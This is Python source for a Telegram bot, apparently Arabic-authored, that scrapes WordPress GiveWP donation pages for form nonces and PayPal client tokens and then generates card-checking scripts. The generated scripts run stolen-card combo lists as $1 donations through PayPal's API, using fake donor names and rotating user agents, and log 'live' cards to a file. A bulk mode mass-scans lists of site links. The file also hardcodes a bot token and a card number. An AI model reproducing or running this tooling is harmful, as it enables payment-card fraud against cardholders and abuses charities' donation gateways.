import telebot
import time
import threading
import gc
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue, Empty
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
bulk_waiting = {}
stop_flags = {}
processing_status = {}

send_queue = Queue()

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def cleanup_memory():
    gc.collect()

# إعداد جلسة لكل خيط
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        retries = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retries, pool_connections=5, pool_maxsize=5)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        thread_local.session = session
    return thread_local.session

# Worker للإرسال
def send_worker():
    while True:
        task = send_queue.get()
        if task is None:
            break
        chat_id, file_path, caption = task
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    bot.send_document(chat_id, f, caption=caption, parse_mode="HTML")
                os.remove(file_path)
            time.sleep(0.5)
        except Exception as e:
            print(f"Error sending: {e}")
            if os.path.exists(file_path):
                try: os.remove(file_path)
                except: pass
        finally:
            send_queue.task_done()

# 2 عامل إرسال فقط
for _ in range(2):
    threading.Thread(target=send_worker, daemon=True).start()

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name

    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.

[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    video_url = 'https://t.me/C0CCOCOvjk/9'
    bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)

# === نظام المراسلة ===
@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and m.from_user.id not in bulk_waiting)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    bot.send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    bot.send_message(user_id, f"Admin response:\n\n{message.text}")
    bot.send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
        FRA = types.InlineKeyboardMarkup(row_width=2)
        Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
        FRA.add(Yes22)
        bot.send_message(call.message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
    except:
        pass

# ============ أمر سحب PayPal ============
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        bot.send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text='''- Please send the link like this:

<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
                parse_mode="HTML"
            )
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text="Invalid link format ❌",
                parse_mode="HTML"
            )
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)

        if r.status_code != 200:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text=f"Site returned status: {r.status_code} ❌"
            )
            return

        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text="Gate found ✅"
        )

    except requests.exceptions.Timeout:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
        return
    except requests.exceptions.ConnectionError:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
        return
    except Exception as e:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
        return

    try:
        user = generate_user_agent()
        r = requests.Session()
        headers = {'user-agent': user}
        res = r.get(url=f"{link}", headers=headers, timeout=15).text
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
        anc = re.search(r'"data-client-token":"(.*?)"', res)
        if anc:
            enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        else:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text='''Data Client Token not found ⚠️''',
                parse_mode="HTML"
            )
            return
    except Exception as e:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text=f'''Error extracting data ❌\n<code>{str(e)[:100]}</code>''',
            parse_mode="HTML"
        )
        return

    parsed = urlparse(link)
    USER_URL2 = f'https://{parsed.netloc}'
    USER_URL = parsed.path

    headers = {
        'origin': f'{USER_URL2}',
        'referer': f'{USER_URL}',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = MultipartEncoder({
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-hash': (None, nonec),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = data.content_type
    params = {'action': 'give_paypal_commerce_create_order'}

    response = r.post(
        f'{USER_URL2}/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data,
        timeout=15
    )
    
    try:
        tok = response.json()['data']['id']
    except:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text='Token not In Data ❌',
            parse_mode="HTML"
        )
        return

    headers = {
        'authorization': f'Bearer {au}',
        'content-type': 'application/json',
        'user-agent': user,
    }
    ccx = '4059986126444431|11|30|947'
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
            },
        },
        'application_context': {'vault': False},
    }

    response = r.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
        headers=headers,
        json=json_data,
        timeout=15
    )

    data = MultipartEncoder({
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-hash': (None, nonec),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = data.content_type
    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': tok,
    }

    response = r.post(
        f'{USER_URL2}/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data,
        timeout=15
    )
    
    if 'ORDER_NOT_APPROVED' in response.text:
        msg = 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'
    else:
        try:
            msg = response.json()['data']['error']
        except:
            msg = html.escape(response.text[:100])

    text_content = f'''# PayPal Gateway
# Link: {link}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        url = '{link}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
            time.sleep(1)
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''

    file_name = f'@nnunrr_{massege.from_user.id}.py'
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(text_content)
    with open(file_name, "rb") as f:
        bot.send_document(
            chat_id=massege.chat.id,
            document=f,
            caption=f'''The gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Link: <code>{link}</code>
id form: <code>{id_form1}</code>
id form2: <code>{id_form2}</code>
nonce: <code>{nonec}</code>
client token: <code>{au}</code>
id payment: <code>{tok}</code>
msg gateway: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
            parse_mode="HTML"
        )
    os.remove(file_name)

# ============ أمر bulk ============
@bot.message_handler(commands=['bulk'])
def bulk_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    user_id = message.from_user.id
    bulk_waiting[user_id] = True
    msg = bot.reply_to(message, """📁 <b>Bulk Mode Active</b>
━━━━━━━━━━━━━━━━━━
Send .txt files (one link per line)
You can send multiple files

<b>Commands:</b>
🛑 /stop [number] - Stop a specific file
🛑 /stop - Stop all files
✅ /done - End bulk mode
━━━━━━━━━━━━━━━━━━""", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def stop_bulk_file(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) > 1:
            file_num = int(parts[1])
            if user_id in stop_flags and file_num in stop_flags[user_id]:
                stop_flags[user_id][file_num].set()
                bot.reply_to(message, f"🛑 Stopping File #{file_num}...")
            else:
                bot.reply_to(message, f"❌ File #{file_num} not found.")
        else:
            if user_id in stop_flags:
                for event in stop_flags[user_id].values():
                    event.set()
                bot.reply_to(message, "🛑 Stopping all files...")
            else:
                bot.reply_to(message, "❌ No active files to stop.")
    except:
        bot.reply_to(message, "Usage: /stop [file_number]")

@bot.message_handler(commands=['done'])
def bulk_done(message):
    user_id = message.from_user.id
    if user_id in bulk_waiting:
        del bulk_waiting[user_id]
        if user_id in stop_flags:
            for event in stop_flags[user_id].values():
                event.set()
            del stop_flags[user_id]
        bot.reply_to(message, "✅ Bulk mode ended.")
    else:
        bot.reply_to(message, "You are not in bulk mode.")

@bot.message_handler(content_types=['document'])
def handle_bulk_file(message):
    user_id = message.from_user.id
    if user_id in bulk_waiting:
        threading.Thread(target=process_bulk_file, args=(message,), daemon=True).start()
    else:
        bot.reply_to(message, "Use /bulk first to start bulk extraction.")

def check_link(link):
    """فحص رابط PayPal"""
    try:
        if not link.startswith(("http://", "https://")):
            return None

        session = get_session()
        r = session.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=8, allow_redirects=True)
        if r.status_code != 200:
            return None

        res = r.text
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
        anc = re.search(r'"data-client-token":"(.*?)"', res)

        if not all([id_form1, id_form2, nonec, anc]):
            return None

        id_form1 = id_form1.group(1)
        id_form2 = id_form2.group(1)
        nonec = nonec.group(1)
        enc = anc.group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec)
        if not au:
            return None
        au = au.group(1)

        return {
            'link': link,
            'id_form1': id_form1,
            'id_form2': id_form2,
            'nonec': nonec,
            'au': au
        }
    except Exception:
        return None

def process_bulk_file(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return

    try:
        # تحميل الملف
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # قراءة الروابط
        lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in lines if link.strip()]
        del downloaded_file
        del lines
        cleanup_memory()

        if not links:
            bot.reply_to(message, "❌ File is empty.")
            return

        total = len(links)
        file_num = len(stop_flags.get(user_id, {})) + 1

        if user_id not in stop_flags:
            stop_flags[user_id] = {}
        stop_event = threading.Event()
        stop_flags[user_id][file_num] = stop_event

        progress = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock()
        }
        status_key = f"{user_id}_{file_num}"
        processing_status[status_key] = progress

        status_msg = bot.reply_to(
            message,
            f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0%
━━━━━━━━━━━━━━━━━━
🛑 /stop {file_num} to stop this file""",
            parse_mode="HTML"
        )

        # خيط مستقل للتحديث كل 5 ثواني
        def update_status_loop():
            last_text = ""
            while not stop_event.is_set():
                time.sleep(5)
                with progress['lock']:
                    processed = progress['processed']
                    live = progress['live']
                    dead = progress['dead']
                    if processed >= total:
                        break
                    if processed == 0:
                        continue
                    percent = int((processed / total) * 100)
                    bar_length = 20
                    filled = int((percent / 100) * bar_length)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop {file_num} to stop this file"""
                    if text != last_text:
                        try:
                            bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                            last_text = text
                        except Exception:
                            pass

        updater = threading.Thread(target=update_status_loop, daemon=True)
        updater.start()

        # المعالجة بدفعات صغيرة - مستقرة للملفات الكبيرة
        batch_size = 20
        max_workers = 10
        
        for i in range(0, total, batch_size):
            if stop_event.is_set():
                break

            batch_links = links[i:i + batch_size]
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_link = {executor.submit(check_link, link): link for link in batch_links}
                
                for future in as_completed(future_to_link, timeout=30):
                    if stop_event.is_set():
                        break
                    
                    try:
                        result = future.result(timeout=8)
                    except Exception:
                        result = None

                    with progress['lock']:
                        progress['processed'] += 1

                        if result:
                            progress['live'] += 1
                            live_idx = progress['live']
                            try:
                                code = generate_gateway_code(result, live_idx, file_num)
                                file_name = f'gateway_{file_num}_{live_idx}_{user_id}.py'
                                with open(file_name, 'w', encoding='utf-8') as f:
                                    f.write(code)
                                caption = f"""✅ <b>File #{file_num} - Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
                                send_queue.put((chat_id, file_name, caption))
                            except Exception as e:
                                print(f"Error preparing file: {e}")
                        else:
                            progress['dead'] += 1

            del batch_links
            cleanup_memory()
            time.sleep(0.5)  # راحة بين الدفعات

        # إيقاف خيط التحديث
        stop_event.set()
        updater.join(timeout=1)

        # الرسالة النهائية
        with progress['lock']:
            processed = progress['processed']
            live = progress['live']
            dead = progress['dead']

        if processed < total and stop_event.is_set():
            final_text = f"""🛑 <b>File #{file_num} Stopped!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Checked: {processed}
✅ Live (Sent): {live}
❌ Dead: {dead}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish."""
        else:
            if live > 0:
                final_text = f"""📊 <b>✅ File #{file_num} Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""
            else:
                final_text = f"""📊 <b>❌ File #{file_num} - No live links found!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: {dead}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""

        try:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            bot.send_message(chat_id, final_text, parse_mode="HTML")

        if status_key in processing_status:
            del processing_status[status_key]
        
        del links
        cleanup_memory()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
        cleanup_memory()

def generate_gateway_code(data, idx, file_num=1):
    return f'''# PayPal Gateway {idx} (File {file_num})
# Link: {data['link']}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal{file_num}_{idx}:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{data['id_form1']}"
        self.id_form2 = "{data['id_form2']}"
        self.nonec = "{data['nonec']}"
        self.au = "{data['au']}"
        self.url = "{data['link'].split('//')[1].split('/')[0]}"
        self.inurl = "/" + "/".join(data['link'].split('//')[1].split('/')[1:]) if len(data['link'].split('//')[1].split('/')) > 1 else ""
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal{file_num}_{idx}()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
            time.sleep(1)
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal{file_num}_{idx}()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''

# === نظام الحظر ===
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
    except:
        bot.reply_to(message, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        bot.reply_to(message, "Usage: /unblock2 [user_id]")

# === تشغيل البوت المستمر ===
print('✅ Bot is running...')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(3)
